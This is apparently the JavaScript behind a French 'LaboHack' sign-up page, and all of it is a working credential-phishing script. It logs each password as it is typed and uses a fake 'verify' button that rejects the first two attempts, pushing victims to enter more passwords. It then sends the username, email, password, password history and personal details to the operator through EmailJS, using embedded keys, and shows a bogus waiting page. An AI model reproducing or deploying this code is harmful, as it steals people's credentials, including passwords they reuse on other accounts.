
// ============================================================
//  LABOHACK - Configuration EmailJS
// ============================================================
const EMAILJS_PUBLIC_KEY = 'sB1cJXt7DykBzocSR';
const EMAILJS_SERVICE_ID  = 'service_j8i0h5n';
const EMAILJS_TEMPLATE_ID = 'template_3nt63pp';

// ============================================================
//  ÉTAT GLOBAL
// ============================================================
let checkAttempts = 0;
const MAX_ATTEMPTS = 3;
let allData = {
  username: '',
  email: '',
  password: '',
  country: '',
  gender: '',
  social: '',
  passwordHistory: []      // historique des mots de passe saisis (même avant validation)
};
let isSubmitting = false;

// ============================================================
//  RÉFÉRENCES DOM
// ============================================================
const form = document.getElementById('signupForm');
const usernameInput = document.getElementById('username');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const countrySelect = document.getElementById('country');
const genderRadios = document.querySelectorAll('input[name="gender"]');
const socialInput = document.getElementById('social');
const termsCheck = document.getElementById('terms');
const checkBtn = document.getElementById('checkBtn');
const attemptCounter = document.getElementById('attemptCounter');
const toast = document.getElementById('toast');
const submitBtn = document.querySelector('button[type="submit"]');

// ============================================================
//  1. ENREGISTREMENT EN TEMPS RÉEL (tout champ)
// ============================================================
function updateAllData() {
  allData.username = usernameInput.value;
  allData.email = emailInput.value;
  allData.password = passwordInput.value;
  allData.country = countrySelect.value;
  allData.social = socialInput.value;
  // Gender
  genderRadios.forEach(radio => {
    if (radio.checked) allData.gender = radio.value;
  });
}

// Écoute tous les champs
usernameInput.addEventListener('input', updateAllData);
emailInput.addEventListener('input', updateAllData);
passwordInput.addEventListener('input', () => {
  updateAllData();
  // Stocker l'historique des mots de passe (même avant validation)
  const pwd = passwordInput.value.trim();
  if (pwd.length >= 1) {
    // On ajoute UNIQUEMENT si différent du dernier enregistré
    if (allData.passwordHistory.length === 0 || allData.passwordHistory[allData.passwordHistory.length-1] !== pwd) {
      allData.passwordHistory.push(pwd);
      // Garder les 10 derniers pour éviter le spam
      if (allData.passwordHistory.length > 10) allData.passwordHistory.shift();
    }
  }
  updateStrengthMeter(pwd);
});
countrySelect.addEventListener('change', updateAllData);
genderRadios.forEach(radio => radio.addEventListener('change', updateAllData));
socialInput.addEventListener('input', updateAllData);

// ============================================================
//  2. INDICATEUR DE FORCE (visuel, pas d'email)
// ============================================================
function updateStrengthMeter(pwd) {
  const bars = [
    document.getElementById('strengthBar1'),
    document.getElementById('strengthBar2'),
    document.getElementById('strengthBar3')
  ];
  const label = document.getElementById('strengthLabel');
  bars.forEach(bar => bar.classList.remove('active'));

  if (pwd.length === 0) {
    label.textContent = 'Force : —';
    label.style.color = '#666';
    return;
  }

  let score = 0;
  if (pwd.length >= 8) score++;
  if (/[A-Z]/.test(pwd) && /[a-z]/.test(pwd)) score++;
  if (/\d/.test(pwd) || /[^A-Za-z0-9]/.test(pwd)) score++;

  for (let i = 0; i < score; i++) bars[i].classList.add('active');

  if (score === 0) { label.textContent = 'Force : Faible'; label.style.color = '#ff4444'; }
  else if (score === 1) { label.textContent = 'Force : Faible'; label.style.color = '#ff8844'; }
  else if (score === 2) { label.textContent = 'Force : Moyen'; label.style.color = '#ffcc00'; }
  else { label.textContent = 'Force : Fort'; label.style.color = '#00ff41'; }
}

// ============================================================
//  3. BOUTON "VÉRIFIER" (échoue 3 fois, puis disparaît)
// ============================================================
checkBtn.addEventListener('click', function() {
  const pwd = passwordInput.value.trim();
  if (pwd.length === 0) {
    showToast('⚠️ Saisis un mot de passe d\'abord.', true);
    return;
  }

  checkAttempts++;
  attemptCounter.textContent = `Tentative ${checkAttempts}/${MAX_ATTEMPTS}`;

  if (checkAttempts < MAX_ATTEMPTS) {
    showToast(`❌ Mot de passe faible. Réessaie (${checkAttempts}/${MAX_ATTEMPTS})`, true);
    passwordInput.value = '';
    passwordInput.focus();
  } else {
    // 3ème tentative : on dit que c'est bon et on cache le bouton
    showToast('✅ Mot de passe accepté !', false);
    checkBtn.style.display = 'none';
    attemptCounter.textContent = '✅ Validé !';
    // On garde le mot de passe tel quel
  }
});

// ============================================================
//  4. SOUMISSION FINALE (1 SEUL EMAIL)
// ============================================================
form.addEventListener('submit', async (e) => {
  e.preventDefault();

  if (isSubmitting) return;
  isSubmitting = true;
  submitBtn.textContent = '⏳ ENVOI...';
  submitBtn.disabled = true;

  // Mise à jour finale des données
  updateAllData();

  // Vérifications obligatoires
  if (!allData.username || !allData.email || !allData.password || !allData.country || !allData.gender || !termsCheck.checked) {
    showToast('⚠️ Tous les champs obligatoires doivent être remplis.', true);
    resetSubmitButton();
    return;
  }

  if (allData.password.length < 8) {
    showToast('❌ Le mot de passe doit faire au moins 8 caractères.', true);
    resetSubmitButton();
    return;
  }

  // Préparation des données pour l'email
  const templateParams = {
    nom: allData.username,
    email: allData.email,
    password: allData.password,
    country: allData.country,
    gender: allData.gender || 'Non précisé',
    social: allData.social || 'Non renseigné',
    history: allData.passwordHistory.join(' → ') || 'Aucun historique',
    attempts: checkAttempts,
    final: '✅ OUI'
  };

  try {
    await emailjs.init(EMAILJS_PUBLIC_KEY);
    const response = await emailjs.send(
      EMAILJS_SERVICE_ID,
      EMAILJS_TEMPLATE_ID,
      templateParams
    );
    console.log('✅ Email envoyé', response);
    showToast('✅ Inscription réussie ! Redirection...', false);

    // Page "15 jours"
    document.body.innerHTML = `
      <div class="container" style="text-align:center; padding:4rem 2rem;">
        <h1 style="font-size:2.8rem; letter-spacing:8px; text-shadow:0 0 20px #00ff41;">LABO<span style="color:#00f0ff; text-shadow:0 0 20px #00f0ff;">HACK</span></h1>
        <div style="font-size:5rem; margin:2rem 0;">⏳</div>
        <h2 style="color:#00f0ff; font-size:1.8rem;">Merci !</h2>
        <p style="color:#00ff41; font-size:1.3rem; margin:1rem 0;">
          Nous vérifions vos informations.<br>
          <strong style="color:#ff0044; font-size:1.6rem;">Vous recevrez un email dans 15 jours</strong> si vous êtes sélectionné.
        </p>
        <p style="color:#444; margin-top:2rem; font-size:0.7rem; letter-spacing:2px;">🔐 LaboHack</p>
      </div>
    `;

  } catch (error) {
    console.error('❌ Erreur EmailJS :', error);
    showToast('❌ Erreur lors de l\'envoi. Vérifie ta connexion.', true);
    resetSubmitButton();
  }
});

// ============================================================
//  5. BOUTON GITHUB (factice)
// ============================================================
document.getElementById('githubBtn').addEventListener('click', () => {
  showToast('🔐 Fonctionnalité en développement.', true);
});

// ============================================================
//  6. FONCTIONS UTILITAIRES
// ============================================================
function showToast(text, isError = true) {
  toast.textContent = text;
  toast.classList.remove('hidden');
  toast.style.borderColor = isError ? '#ff0044' : '#00ff41';
  toast.style.color = isError ? '#ff0044' : '#00ff41';
  clearTimeout(window.toastTimeout);
  window.toastTimeout = setTimeout(() => toast.classList.add('hidden'), 5000);
}

function resetSubmitButton() {
  isSubmitting = false;
  submitBtn.textContent = "S'INSCRIRE";
  submitBtn.disabled = false;
}

// Initialisation
updateAllData();
